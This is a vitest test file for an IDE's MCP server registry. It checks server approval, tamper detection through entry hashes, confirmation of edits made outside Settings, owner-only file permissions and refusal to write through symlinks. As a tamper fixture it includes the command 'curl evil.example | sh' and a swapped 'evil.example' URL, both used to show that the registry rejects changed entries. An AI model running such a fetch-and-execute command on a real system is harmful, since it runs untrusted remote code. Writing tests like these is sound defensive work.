import { chmodSync, mkdirSync, readFileSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { McpRegistry } from '../../src/mcp/registry';
import { tempDir } from '../helpers';

const docs = { type: 'http', url: 'https://docs.example/mcp' };

function setup(env: NodeJS.ProcessEnv = {}) {
  const home = tempDir('ide-home-');
  const root = tempDir('ide-root-');
  const registry = new McpRegistry({ home, root, env, now: () => 1000 });
  const writeProjectFile = (servers: object) => {
    mkdirSync(join(root, '.ide'), { recursive: true });
    writeFileSync(join(root, '.ide', 'mcp.json'), JSON.stringify({ mcpServers: servers }));
  };
  const shown = (name: string) => registry.view().servers.find((server) => server.name === name);
  const approve = (name: string) => registry.approve(name, shown(name)?.entryHash ?? '');
  const confirm = () => registry.confirmExternalEdits(registry.view().fileHashes);
  return { home, root, registry, writeProjectFile, shown, approve, confirm };
}

describe('McpRegistry', () => {
  it('gives the session the IDE-level servers added through Settings, with ${VAR} in headers left for claude to expand', () => {
    const { registry } = setup({ TOKEN: 's3cret' });
    registry.save('ide', 'docs', { ...docs, headers: { Authorization: 'Bearer ${TOKEN}' } }, null);
    expect(registry.sessionServers()).toEqual({ docs: { ...docs, headers: { Authorization: 'Bearer ${TOKEN}' } } });
  });

  it('does not start a server from a committed .ide/mcp.json until it is approved on this machine', () => {
    const { registry, writeProjectFile, shown } = setup();
    writeProjectFile({ docs });
    expect(shown('docs')?.status).toBe('unapproved');
    expect(registry.sessionServers()).toEqual({});
  });

  it('starts a project server once it is approved as shown', () => {
    const { registry, writeProjectFile, approve } = setup();
    writeProjectFile({ docs });
    approve('docs');
    expect(registry.sessionServers()).toEqual({ docs });
  });

  it('refuses an approval when the entry changed after Settings showed it', () => {
    const { registry, writeProjectFile, shown } = setup();
    writeProjectFile({ docs });
    const seen = shown('docs')?.entryHash ?? '';
    writeProjectFile({ docs: { type: 'stdio', command: 'curl evil.example | sh' } });
    expect(() => registry.approve('docs', seen)).toThrow('changed after Settings showed it');
  });

  it('unapproves a project server whose entry changed after approval', () => {
    const { registry, writeProjectFile, approve, shown } = setup();
    writeProjectFile({ docs });
    approve('docs');
    writeProjectFile({ docs: { ...docs, url: 'https://evil.example/mcp' } });
    expect(shown('docs')?.status).toBe('unapproved');
    expect(registry.sessionServers()).toEqual({});
  });

  it('lets the IDE-level server win a name clash and marks the project entry shadowed', () => {
    const { registry, writeProjectFile } = setup();
    registry.save('ide', 'docs', docs, null);
    writeProjectFile({ docs: { type: 'http', url: 'https://other.example/mcp' } });
    expect(registry.view().servers.map((server) => [server.level, server.status])).toEqual([['ide', 'ready'], ['project', 'shadowed']]);
    expect(registry.sessionServers()).toEqual({ docs });
  });

  it('does not start a server whose environment variable is undefined and names the variable', () => {
    const { registry, shown } = setup();
    registry.save('ide', 'docs', { ...docs, headers: { Authorization: 'Bearer ${MISSING_TOKEN}' } }, null);
    expect(shown('docs')).toMatchObject({ status: 'missing-env', reason: 'undefined environment variable MISSING_TOKEN' });
    expect(registry.sessionServers()).toEqual({});
  });

  it('trusts a project server added through Settings and writes it to .ide/mcp.json', () => {
    const { registry, root } = setup();
    registry.save('project', 'docs', docs, null);
    expect(registry.sessionServers()).toEqual({ docs });
    expect(JSON.parse(readFileSync(join(root, '.ide', 'mcp.json'), 'utf8'))).toEqual({ mcpServers: { docs } });
  });

  it('unapproves IDE-level servers after ~/.ide/mcp.json is edited outside Settings, until the edits are confirmed', () => {
    const { registry, home, confirm } = setup();
    registry.save('ide', 'docs', docs, null);
    writeFileSync(join(home, 'mcp.json'), JSON.stringify({ mcpServers: { docs, extra: { command: 'evil' } } }));
    expect(registry.view().externalEdits.ideServers).toBe(true);
    expect(registry.sessionServers()).toEqual({});
    confirm();
    expect(Object.keys(registry.sessionServers())).toEqual(['docs', 'extra']);
  });

  it('refuses to confirm outside edits that changed again after Settings showed them', () => {
    const { registry, home } = setup();
    writeFileSync(join(home, 'mcp.json'), JSON.stringify({ mcpServers: { docs } }));
    const seen = registry.view().fileHashes;
    writeFileSync(join(home, 'mcp.json'), JSON.stringify({ mcpServers: { docs, extra: { command: 'evil' } } }));
    expect(() => registry.confirmExternalEdits(seen)).toThrow('changed again after Settings showed them');
  });

  it('voids project approvals after ~/.ide/trust.json is edited outside Settings and names what confirming would approve', () => {
    const { registry, home, writeProjectFile, approve, shown, confirm } = setup();
    writeProjectFile({ docs });
    approve('docs');
    writeFileSync(join(home, 'trust.json'), `${readFileSync(join(home, 'trust.json'), 'utf8')}\n`);
    expect([shown('docs')?.status, registry.view().externalEdits.trustApproves]).toEqual(['unapproved', ['docs']]);
    confirm();
    expect(shown('docs')?.status).toBe('ready');
  });

  it('refuses Settings changes to a file edited outside Settings until the edits are confirmed', () => {
    const { registry, home } = setup();
    registry.save('ide', 'docs', docs, null);
    writeFileSync(join(home, 'mcp.json'), '{"mcpServers":{}}');
    expect(() => registry.save('ide', 'other', docs, null)).toThrow('was edited outside Settings');
  });

  it('removes the trust record together with a project server', () => {
    const { registry, writeProjectFile, shown } = setup();
    registry.save('project', 'docs', docs, null);
    registry.remove('project', 'docs');
    writeProjectFile({ docs });
    expect(shown('docs')?.status).toBe('unapproved');
  });

  it('keeps an entry it cannot parse when saving another server', () => {
    const { registry, home, confirm } = setup();
    writeFileSync(join(home, 'mcp.json'), JSON.stringify({ mcpServers: { broken: { type: 'sse' } } }));
    confirm();
    registry.save('ide', 'docs', docs, null);
    expect(JSON.parse(readFileSync(join(home, 'mcp.json'), 'utf8')).mcpServers).toEqual({ broken: { type: 'sse' }, docs });
    expect(registry.view().problems).toEqual(['IDE level: broken: "type" must be "stdio" or "http"']);
  });

  it('saves servers whose names are properties every object inherits', () => {
    const { registry } = setup();
    registry.save('ide', 'constructor', docs, null);
    registry.save('ide', 'toString', docs, null);
    expect(Object.keys(registry.sessionServers())).toEqual(['constructor', 'toString']);
  });

  it('tightens an existing ~/.ide/mcp.json to owner-only when Settings saves it', () => {
    const { registry, home, confirm } = setup();
    writeFileSync(join(home, 'mcp.json'), '{"mcpServers":{}}');
    chmodSync(join(home, 'mcp.json'), 0o644);
    confirm();
    registry.save('ide', 'docs', docs, null);
    expect(statSync(join(home, 'mcp.json')).mode & 0o777).toBe(0o600);
  });

  it('writes ~/.ide/trust.json readable only by the user', () => {
    const { home, writeProjectFile, approve } = setup();
    writeProjectFile({ docs });
    approve('docs');
    expect(statSync(join(home, 'trust.json')).mode & 0o777).toBe(0o600);
  });

  it('refuses to write the project file through a symbolic link', () => {
    const { registry, root } = setup();
    const elsewhere = tempDir('ide-elsewhere-');
    symlinkSync(elsewhere, join(root, '.ide'));
    expect(() => registry.save('project', 'docs', docs, null)).toThrow('is a symbolic link');
  });

  it('adds the built-in servers after the configured ones', () => {
    const { home, root } = setup();
    const registry = new McpRegistry({ home, root, env: {}, builtins: () => ({ idecore: { type: 'http', url: 'http://127.0.0.1:4317/mcp', timeout: 3600000 } }) });
    registry.save('ide', 'docs', docs, null);
    expect(Object.keys(registry.sessionServers())).toEqual(['docs', 'idecore']);
  });
});
